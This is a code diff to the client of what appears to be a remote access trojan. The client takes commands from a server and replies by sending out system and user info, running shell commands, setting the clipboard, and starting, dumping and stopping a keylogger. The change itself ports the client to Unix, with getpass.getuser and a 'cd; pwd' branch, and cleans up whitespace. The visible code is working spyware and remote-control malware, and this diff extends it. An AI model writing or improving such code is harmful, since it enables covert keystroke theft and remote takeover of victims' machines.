@@ -1,3 +1,4 @@
+import getpass
 import json
 import logging
 import os
@@ -220,7 +221,7 @@ class Client(object):
             # ...
 
             if data[0] == '<INFO>':
-                self.send(json.dumps([platform.system(), os.path.expanduser('~'), os.getlogin()]).encode())
+                self.send(json.dumps([platform.system(), os.path.expanduser('~'), getpass.getuser()]).encode())
                 continue 
 
             if data[0] == '--l':
@@ -252,7 +253,7 @@ class Client(object):
                 pyperclip.copy(data[1])
                 self.send(b'<READY>')
                 continue
-            
+
             if data[0] == '--u':
                 self.send('User: {}\nOS: {} {} ({})\n'.format(os.environ['USERNAME'], platform.system(), platform.release(), platform.platform()).encode())
                 continue
@@ -278,7 +279,7 @@ class Client(object):
                     continue
                 self.send(b'Keylogger already running\n')
                 continue
-                
+
             if data[0] == '--k dump':
                 if not _pynput:
                     self.send(b'Keylogger is disabled due to import error.')
@@ -289,7 +290,7 @@ class Client(object):
                 else:
                     self.send(KeyboardLogs.encode())
                 continue
-            
+
             if data[0] == '--k stop':
                 if not _pynput:
                     self.send(b'Keylogger is disabled due to import error.')
@@ -324,7 +325,11 @@ class Client(object):
                 continue
 
             if data[0][:2].lower() == 'cd' or data[0][:5] == 'chdir':
-                process = subprocess.Popen(data[0] + ' & cd', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                if platform.system() == 'Windows':
+                    _pwd = ' & cd'
+                else:
+                    _pwd = '; pwd'
+                process = subprocess.Popen(data[0] + '{0}'.format(_pwd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 error = process.stderr.read().decode()
                 if error == "":
                     output = process.stdout.read().decode()
@@ -371,7 +376,7 @@ def main():
         client.receive_commands()
     except Exception as e:
         logging.critical('Error in main: {}'.format(str(e)))
-    
+
 
 if __name__ == '__main__':
     while 1:
